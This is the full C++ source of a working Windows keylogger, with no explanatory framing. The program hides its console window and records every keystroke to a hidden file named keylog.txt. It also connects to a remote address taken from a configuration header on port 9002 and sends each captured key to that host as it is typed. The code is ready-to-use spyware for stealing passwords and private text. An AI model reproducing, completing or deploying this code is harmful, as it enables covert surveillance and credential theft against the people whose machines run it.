#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <map>
#include <string>
#include <thread>
#include <atomic>
#include <csignal>
#include <chrono>
#include <array>
#include "config.h" 

#pragma comment(lib, "Ws2_32.lib")

std::atomic<bool> running(true);
SOCKET tcp_socket;

void log(const char* key, std::ofstream& logfile) {
    logfile << key;
    logfile.flush();
}

void log_and_send(const std::string& key, std::ofstream& logfile) {
    std::string message = key + "\n"; // Append newline character
    log(message.c_str(), logfile);
    try {
        int sent = send(tcp_socket, message.c_str(), message.size(), 0);
        if (sent == SOCKET_ERROR) {
            std::cerr << "TCP Send Error: " << WSAGetLastError() << std::endl;
        }
    }
    catch (...) {
        std::cout << "TCP Send Exception" << std::endl;
    }
}

bool isKeyPressed(int key) {
    return (GetAsyncKeyState(key) & 0x8000) != 0;
}

void hideWindow() {
    HWND stealth;
    if (GetConsoleWindow() == NULL) {
        AllocConsole();
    }
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    if (stealth != NULL) {
        ShowWindow(stealth, SW_HIDE);
    }
}


std::string get_hostname() {
    std::array<char, 256> buffer;
    if (gethostname(buffer.data(), buffer.size()) == SOCKET_ERROR) {
        return "UnknownHost";
    }
    return std::string(buffer.data());
}

std::string translateSpecialKey(int key) {
    switch (key) {
    case VK_SPACE: return " ";
    case VK_RETURN: return "\n";
    case VK_TAB: return "\t";
    case VK_SHIFT: return "[SHIFT]";
    case VK_BACK: return "[BACKSPACE]";
    case VK_RBUTTON: return "[RIGHT BUTTON]";
    case VK_LBUTTON: return "[LEFT BUTTON]";
    case VK_ESCAPE: return "[ESCAPE]";
    case VK_CONTROL: return "[CTRL]";
    default: return "";
    }
}

void signalHandler(int signum) {
    running = false;
}

int main() {
    std::signal(SIGINT, signalHandler);

    hideWindow();

    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios_base::app);

    // Make the log file hidden
    SetFileAttributes(L"keylog.txt", FILE_ATTRIBUTE_HIDDEN);

    std::map<int, bool> keyState;
    for (int i = 0; i < 256; i++) {
        keyState[i] = false;
    }

    auto cKeyPressStart = std::chrono::steady_clock::now();
    bool cKeyHeld = false;

    // Set up TCP socket
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }
    tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (tcp_socket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(9002);
    if (inet_pton(AF_INET, IP_ADDRESS, &server_addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported" << std::endl;
        closesocket(tcp_socket);
        WSACleanup();
        return 1;
    }

    if (connect(tcp_socket, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(tcp_socket);
        WSACleanup();
        return 1;
    }

    while (running) {
        for (int key = 8; key <= 255; key++) {
            bool isPressed = isKeyPressed(key);
            if (isPressed && !keyState[key]) {
                keyState[key] = true;

                std::string specialKey = translateSpecialKey(key);
                if (!specialKey.empty()) {
                    log_and_send(specialKey, logfile);
                }
                else {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    WCHAR buffer[16];
                    int result = ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 16, 0);
                    if (result > 0) {
                        buffer[result] = '\0';
                        std::wstring ws(buffer);
                        std::string str(ws.begin(), ws.end());
                        log_and_send(str, logfile);
                    }
                }

                if (key == 'C') {
                    if (!cKeyHeld) {
                        cKeyPressStart = std::chrono::steady_clock::now();
                        cKeyHeld = true;
                    }
                }
            }
            else if (!isPressed && keyState[key]) {
                keyState[key] = false;

                if (key == 'C') {
                    cKeyHeld = false;
                }
            }
        }

        if (cKeyHeld) {
            auto cKeyPressDuration = std::chrono::steady_clock::now() - cKeyPressStart;
            if (std::chrono::duration_cast<std::chrono::seconds>(cKeyPressDuration).count() >= 5) {
                running = false;
            }
        }

        Sleep(10);
    }

    closesocket(tcp_socket);
    WSACleanup();

    logfile.close();
    return 0;
}
